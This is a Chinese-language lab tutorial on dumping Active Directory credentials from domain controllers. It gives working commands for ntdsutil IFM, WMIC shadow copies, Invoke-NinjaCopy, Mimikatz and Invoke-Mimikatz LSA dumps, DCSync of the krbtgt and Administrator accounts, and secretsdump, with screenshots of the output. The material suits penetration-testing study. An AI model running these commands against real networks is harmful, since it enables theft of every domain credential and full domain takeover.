# 从域控制器中提取Active Directory数据库

## 讲在前面：

从Active Directory中转储凭据的主要技术包括[实时与DC上的LSASS交互](https://adsecurity.org/?page_id=1821)，获取AD数据文件的副本（ntds.dit）或[欺骗域控制器向攻击者复制密码数据](https://adsecurity.org/?p=1729)（欺骗域控制器我是域控制器）  
此处介绍的方法需要提升权限后才可进行，因为它们涉及连接到域控制器以转储凭据。

### **本地安全机构子系统服务**（**LSASS**） <a id="%E6%9C%AC%E5%9C%B0%E5%AE%89%E5%85%A8%E6%9C%BA%E6%9E%84%E5%AD%90%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%EF%BC%88LSASS%EF%BC%89"></a>

是Microsoft Windows操作系统中的一个进程，负责在系统上实施安全策略。它验证登录到Windows计算机或服务器的用户，处理密码更改并创建访问令牌。它还写入Windows安全日志。强制终止lsass.exe将导致系统失去对任何帐户（包括NT AUTHORITY）的访问权限，从而提示重新启动计算机

### 场景思考 <a id="%E5%9C%BA%E6%99%AF%E6%80%9D%E8%80%83"></a>

用户登录后，将生成各种凭据并将其存储在内存中的本地安全授权子系统服务[LSASS](http://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)进程中。这旨在促进单点登录（SSO），确保每次请求资源访问时都不会提示用户。凭据数据可能包括Kerberos票证，NTLM密码哈希，LM密码哈希（如果密码小于15个字符，取决于Windows OS版本和补丁程序级别），甚至是明文密码（以支持WDigest和SSP身份验证等）。尽管可以[阻止Windows计算机](http://support.microsoft.com/kb/299656)在本地计算机SAM数据库（和AD数据库）中[创建LM哈希](http://support.microsoft.com/kb/299656)，但这并不能阻止系统在内存中生成LM哈希。[默认情况下，](https://technet.microsoft.com/en-us/magazine/2006.08.securitywatch.aspx)除非明确启用，否则[Windows Server 2008和Windows Vista将不再](https://technet.microsoft.com/en-us/magazine/2006.08.securitywatch.aspx)为用户[生成LM哈希](https://technet.microsoft.com/en-us/magazine/2006.08.securitywatch.aspx)。从Windows 8.1和Windows Server 2012 R2开始，LM哈希和“明文”密码不再存储在内存中。[kb2871997中也将此功能“反向移植”到了Windows的早期版本（Windows 7/8 / 2008R2 / 2012）](https://adsecurity.org/?p=559)，所以需要防止将“明文”密码放置在LSASS中。

### 注意 <a id="%E6%B3%A8%E6%84%8F"></a>

对于攻击者而言，很少希望直接在目标系统上运行代码，目前的攻击手法都可以实现不在DC上执行代码就达到获取AD所有账户密码的功能。包括针对远程系统远程运行Mimikatz以转储凭据，通过PowerShell Remoting远程使用Invoke-Mimikatz和[DCSync](https://adsecurity.org/?page_id=1821#DCSync)等

> **ntds.dit文件位置: `C:\Windows\NTDS\NTDS.dit`  
> system文件位置:`C:\Windows\System32\config\SYSTEM`  
> sam文件位置:`C:\Windows\System32\config\SAM`**

#### ntds.dit介绍：[https://blog.csdn.net/qq\_41874930/article/details/108141331](https://blog.csdn.net/qq_41874930/article/details/108141331) <a id="ntds.dit%E4%BB%8B%E7%BB%8D%EF%BC%9Ahttps%3A%2F%2Fblog.csdn.net%2Fqq_41874930%2Farticle%2Fdetails%2F108141331"></a>

## 部分方法如下： <a id="%E9%83%A8%E5%88%86%E6%96%B9%E6%B3%95%E5%A6%82%E4%B8%8B%EF%BC%9A"></a>

**环境：**

* DC:Windows2016
* DC:Windows2008
* 客户机：Win7

**注：**此处因其介绍的如下方法本身都需要提权后才可进行操作，故笔者部分操作直接在域控上进行操作，望见谅。

### \*\*\*\*[**使用NTDSUtil的Create IFM在DC上本地捕获ntds.dit文件**](https://adsecurity.org/?p=2398#CreateIFM)\*\*\*\*

笔者在第一次使用该方法时，大家将其称为给域控拍一个快照。

NTDSUtil是一个命令实用程序，用于域控制器处理AD DB \(ntdd .dit\)，并支持为DCPromo创建IFM设置。IFM与DCPromo一起用于“从媒体安装”，因此要升级的服务器不需要通过网络从另一个DC复制域数据。

```text
ntdsutil “ac i ntds” “ifm” “create full c:\temp” q q
```

IFM集是在以下屏幕截图中c:\temp中创建的NTDS.dit数据库的副本。创建IFM时，将捕获并安装VSS快照，并将ntds.dit文件和关联的数据从其中复制到指定的目标文件夹中。

**我们也可以通过WMI或PowerShell远程执行此命令。**

![](https://img-blog.csdnimg.cn/20201003233655845.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BpbmdfUGln,size_16,color_FFFFFF,t_70)

### \*\*\*\*[**使用VSS卷影副本远程拉ntds.dit**](https://adsecurity.org/?p=2398#WMIVSS)\*\*\*\*

利用WMIC（或PowerShell远程处理）创建（或复制现有）VSS

```text
wmic  /node:10.80.0.10 /user:Administrator /password:****** process call create "cmd /c vssadmin create shadow /for=C: 2>&1 > c:\vss.log"
```

![](https://img-blog.csdnimg.cn/20201004000746469.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BpbmdfUGln,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20201004001819939.png)

VSS快照完成后，我们然后将NTDS.dit文件和系统注册表配置单元从VSS复制到DC上的c：驱动器。

```text
wmic /node:10.80.0.10 /user:Administrator /password:***** process call create "cmd /c copy   卷影名\Windows\NTDS\NTDS.dit C:\windows\temp\NTDS.dit 2>&1 > C:\vss2.log"
```

![](https://img-blog.csdnimg.cn/20201004002333995.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BpbmdfUGln,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20201004002434948.png)

```text
wmic /node:10.80.0.10 /user:Administrator /password:*****  process call create "cmd /c copy 卷影名\Windows\System32\config\SYSTEM c:\windows\temp\SYSTEM.hive 2>&1 > C:\vss3.log"
```

![](https://img-blog.csdnimg.cn/20201004002614304.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BpbmdfUGln,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20201004002624820.png)

我们将文件复制到本地计算机。

```text
copy \\10.80.0.10\c$\windows\temp\NTDS.dit c:\NTDS.ditcopy \\10.80.0.10\c$\windows\temp\SYSTEM.hive c:\SYSTEM.hive
```

![](https://img-blog.csdnimg.cn/20201004002943490.png)

这里笔者未能实现通过WMIC传递Kerberos票证来执行相同的操作

### \*\*\*\*[**使用PowerSploit的Invoke-NinjaCopy远程拉ntds.dit（需要在目标DC上启用PowerShell远程处理）**](https://adsecurity.org/?p=2398#InvokeNinjaCopy)\*\*\*\*

[Invoke-NinaCopy](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1)是一项PowerShell功能，可以利用PowerShell远程处理（必须在目标DC上启用PowerShell远程处理）从远程计算机上复制文件（即使该文件已锁定，也可以直接访问该文件）

Invoke-NinaCopy脚本简介：

> ```text
> Invoke-NinaCopy通过打开整个卷（例如c :）来读取句柄并解析NTFS结构，此脚本可以从NTFS卷中复制文件。只需要你拥有域管理员权限，这样你才可以绕过以下保护措施
>     1.由某个进程打开但不能由其他进程打开的文件，例如NTDS.dit文件或SYSTEM注册表配置单元
>     2.在文件上设置SACL标志，以在打开文件时发出警报
>     3.绕过DACL，例如仅允许SYSTEM打开文件的DACL
>
> 如果指定了LocalDestination参数，该文件将被复制到本地服务器（运行脚本的服务器）上指定的文件路径。
> 如果指定了RemoteDestination参数，则文件将被复制到远程服务器上指定的文件路径。
> ```

```text
开启powershell远程执行：Enable-PSRemoting
```

```text
Invoke-NinjaCopy -Path "c:\windows\ntds\ntds.dit" -ComputerName "WIN-OCBQN1EPQUF" -LocalDestination "c:\windows\temp\ntds.dit"
```

![](https://img-blog.csdnimg.cn/20201004013052579.png)

使用[DIT Snapshot Viewer](https://github.com/yosqueoy/ditsnap)，我们可以验证是否成功获取了ntds.dit文件。

![](https://img-blog.csdnimg.cn/2020100401315777.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BpbmdfUGln,size_16,color_FFFFFF,t_70)

#### 注意： <a id="%E6%B3%A8%E6%84%8F%EF%BC%9A"></a>

某些情况下通过Invoke-NinjaCopy复制ntds.dit可能会损坏文件

### \*\*\*\*[**使用Mimikatz在本地转储Active Directory凭据（在DC上）**](https://adsecurity.org/?p=2398#MimikatzLocal)\*\*\*\*

在使用mimikatz获得AD凭据后我们可以发现其中会有krbtgt用户的sid和hash，我们可以用来做黄金票据等工作

```text
lsadump::lsa /inject
```

![](https://img-blog.csdnimg.cn/20201004013340126.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BpbmdfUGln,size_16,color_FFFFFF,t_70)

### \*\*\*\*[**使用Invoke-Mimikatz在本地转储Active Directory凭据（在DC上）**](https://adsecurity.org/?p=2398#InvokeMimikatzLocal)\*\*\*\*

[Invoke-Mimikatz](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1)是由Joe Bialek（[@JosephBialek](https://twitter.com/JosephBialek)）编写[的PowerSploit](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1)的一个组件，该组件将[Mimikatz的](https://github.com/PowerShellMafia/PowerSploit)所有功能合并到Powershell函数中。它“利用Mimikatz 2.0和Invoke-ReflectivePEInjection来将Mimikatz反射性地完全加载到内存中。这使您无需将Mimikatz二进制文件写入磁盘就可以执行转储凭证之类的事情。

如果Invoke-Mimikatz以适当的权限运行，并且目标计算机启用了PowerShell Remoting，则它可以从其他系统中提取凭据，以及远程执行标准的Mimikatz命令，而不会将文件拖放到远程系统上执行。

Invoke-Mimikatz可以将DLL编码的元素（32位和64位版本）换成较新的元素来进行更新

```text
Invoke-Mimikatz -Command '"privilege::debug" "LSADump::LSA /inject" exit'
```

### ![](https://img-blog.csdnimg.cn/2020100401384844.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BpbmdfUGln,size_16,color_FFFFFF,t_70) <a id="%E2%80%8B"></a>

### \*\*\*\*[**使用Invoke-Mimikatz远程转储Active Directory凭据**](https://adsecurity.org/?p=2398#InvokeMimikatzRemote)\*\*\*\*

```text
Invoke-Mimikatz -Command  '"privilege::debug" "LSADump::LSA /inject"' -Computer WIN-OCBQN1EPQUF.pingpig.com
```

### ![](https://img-blog.csdnimg.cn/202010040141562.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BpbmdfUGln,size_16,color_FFFFFF,t_70)

### \*\*\*\*[**使用Mimikatz的DCSync远程转储Active Directory凭据**](https://adsecurity.org/?p=2398#MimikatzDCSync)\*\*\*\*

DCSync之前的利用方法是在域控制器上运行Mimikatz或Invoke-Mimikatz，以获取KRBTGT密码哈希值来创建Golden Tickets。使用Mimikatz的DCSync和适当的权限，攻击者可以通过网络从域控制器中提取密码哈希以及以前的密码哈希，而无需交互式登录或复制Active Directory数据库文件（ntds.dit）。

运行DCSync需要特殊权限。管理员，域管理员或企业管理员以及域控制器计算机帐户的任何成员都可以运行DCSync来提取密码数据。请注意，默认情况下，不仅允许只读域控制器为用户提取密码数据。

DCSync

**DCSync部分命令示例：**

> 在pingpig.com域中提取krbtgt用户帐户的密码数据：
>
> * lsadump::dcsync /domain:pingpig.com /user:krbtgt
>
> 在pingpig.com域中提取管理员用户帐户的密码数据：
>
> * lsadump::dcsync /domain:pingpig.com /user:Administrator
>
> 在pingpig.com域中提取域控制器指定机器帐户的密码数据：
>
> * lsadump::dcsync /domain:pingpig.com /user:win7test1

```text
lsadump::dcsync /domain:pingpig.com /user:krbtgt
```

![](https://img-blog.csdnimg.cn/20201004014746932.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BpbmdfUGln,size_16,color_FFFFFF,t_70)

```text
lsadump::dcsync /domain:pingpig.com /user:Administrator
```

![](https://img-blog.csdnimg.cn/20201004014835985.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BpbmdfUGln,size_16,color_FFFFFF,t_70)

```text
lsadump::dcsync /domain:pingpig.com /user:win7test1-pc$
```

![](https://img-blog.csdnimg.cn/20201004014950472.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BpbmdfUGln,size_16,color_FFFFFF,t_70)

### **Impacket的secretsdump.py-读取NTDS.dit内Hash**

```text
python secretsdump.py -system /tmp/system.hive -ntds /tmp/ntds.dit LOCAL
```

![](https://img-blog.csdnimg.cn/20201004015704289.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1BpbmdfUGln,size_16,color_FFFFFF,t_70)

